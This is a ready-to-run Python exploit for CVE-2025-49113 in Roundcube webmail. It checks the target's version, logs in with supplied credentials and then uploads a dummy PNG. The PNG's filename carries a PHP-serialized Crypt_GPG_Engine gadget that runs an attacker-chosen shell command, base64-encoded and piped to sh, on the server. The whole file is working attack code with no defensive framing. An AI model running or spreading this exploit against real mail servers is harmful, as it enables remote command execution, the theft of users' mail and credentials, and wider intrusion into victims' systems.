import base64
import requests
import re
import sys
import urllib3

urllib3.disable_warnings()

class Crypt_GPG_Engine:
    def __init__(self, command):
        encoded = base64.b64encode(command.encode()).decode()
        self._gpgconf = f'echo "{encoded}"|base64 -d|sh;#'
        self._process = False
        self._homedir = ''

    def gadget(self):
        # Simple serializer, same as PHP's serialize() for this specific object
        return (
            '|O:17:"Crypt_GPG_Engine":3:{'
            f's:9:"\\x00*\\x00_process";b:0;'
            f's:8:"\\x00*\\x00_gpgconf";s:{len(self._gpgconf)}:"{self._gpgconf}";'
            f's:8:"\\x00*\\x00_homedir";s:0:"";'
            '};'
        )


def check_version(base_url):
    print("[*] Checking Roundcube version...")
    headers = {
        "User-Agent": "Roundcube exploit CVE-2025-49113 - Python"
    }
    r = requests.get(base_url, headers=headers, verify=False)
    match = re.search(r'"rcversion":(\d+)', r.text)
    if not match:
        print("[-] Could not detect Roundcube version.")
        sys.exit(1)

    version = match.group(1)
    print(f"[*] Detected Roundcube version: {version}")

    vulnerable_versions = [f"{v:05}" for v in range(10500, 10510)] + [f"{v:05}" for v in range(10600, 10611)]

    if version in vulnerable_versions:
        print("[+] Target is vulnerable!")
    else:
        print("[-] Target is NOT vulnerable.")
        sys.exit(1)


def login(base_url, username, password):
    print("[*] Logging in...")

    session = requests.Session()
    headers = {
        "User-Agent": "Roundcube exploit CVE-2025-49113 - Python"
    }

    # Initial GET to fetch CSRF token
    resp = session.get(base_url, headers=headers, verify=False)
    token_match = re.search(r'"request_token":"([^"]+)"', resp.text)
    if not token_match:
        print("[-] Could not find CSRF token.")
        sys.exit(1)

    csrf = token_match.group(1)

    login_data = {
        '_token': csrf,
        '_task': 'login',
        '_action': 'login',
        '_timezone': 'America/Sao_Paulo',
        '_url': '',
        '_user': username,
        '_pass': password
    }

    login_url = base_url + '/?_task=login'
    r = session.post(login_url, headers=headers, data=login_data, allow_redirects=False, verify=False)

    if r.status_code == 401:
        print("[-] Login failed.")
        sys.exit(1)
    elif r.status_code != 302:
        print(f"[-] Unexpected status code: {r.status_code}")
        sys.exit(1)

    print("[+] Login successful.")
    return session


def upload_gadget(session, base_url, gadget):
    print("[*] Uploading serialized gadget as image filename...")

    upload_url = base_url + '/?_task=settings&_framed=1&_remote=1&_from=edit-!xxx&_id=&_uploadid=upload1337&_unlock=upload1337&_action=upload'

    # Dummy PNG file
    png_data = base64.b64decode(
        'iVBORw0KGgoAAAANSUhEUgAAAIAAAABcCAYAAACmwr2fAAAAAXNSR0IArs4c6QAAAGxlWElmTU0AKgAAAAgABAEaAAUAAAABAAAAPgEbAAUAAAABAAAARgEoAAMAAAABAAIAAIdpAAQAAAABAAAATgAAAAAAAACQAAAAAQAAAJAAAAABAAKgAgAEAAAAAQAAAICgAwAEAAAAAQAAAFwAAAAAbqF/KQAAAAlwSFlzAAAWJQAAFiUBSVIk8AAAAWBJREFUeAHt1MEJACEAxMDzSvEn2H97CrYx2Q4Swo659vkaa+BnyQN/BgoAD6EACgA3gOP3AAWAG8Dxe4ACwA3g+D1AAeAGcPweoABwAzh+D1AAuAEcvwcoANwAjt8DFABuAMfvAQoAN4Dj9wAFgBvA8XuAAsAN4Pg9QAHgBnD8HqAAcAM4fg9QALgBHL8HKADcAI7fAxQAbgDH7wEKADeA4/cABYAbwPF7gALADeD4PUAB4AZw/B4AD+ACXpACLpoPsQQAAAAASUVORK5CYII='
    )

    boundary = '----WebKitFormBoundary1337'
    multipart_data = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="_file[]"; filename="{gadget}"\r\n'
        f"Content-Type: image/png\r\n\r\n"
    ).encode() + png_data + f"\r\n--{boundary}--\r\n".encode()

    headers = {
        'Content-Type': f'multipart/form-data; boundary={boundary}'
    }

    r = session.post(upload_url, headers=headers, data=multipart_data, verify=False)

    if r.status_code == 200:
        print("[+] Gadget uploaded successfully!")
    else:
        print(f"[-] Upload failed with status code {r.status_code}")
        sys.exit(1)


def main():
    if len(sys.argv) != 5:
        print("Usage: python3 CVE-2025-49113.py <url> <username> <password> <command>")
        sys.exit(1)

    base_url = sys.argv[1].rstrip('/')
    username = sys.argv[2]
    password = sys.argv[3]
    command = sys.argv[4]

    print("[*] Starting CVE-2025-49113 exploit...")

    check_version(base_url)
    gadget_obj = Crypt_GPG_Engine(command)
    gadget = gadget_obj.gadget()
    session = login(base_url, username, password)
    upload_gadget(session, base_url, gadget)


if __name__ == '__main__':
    main()
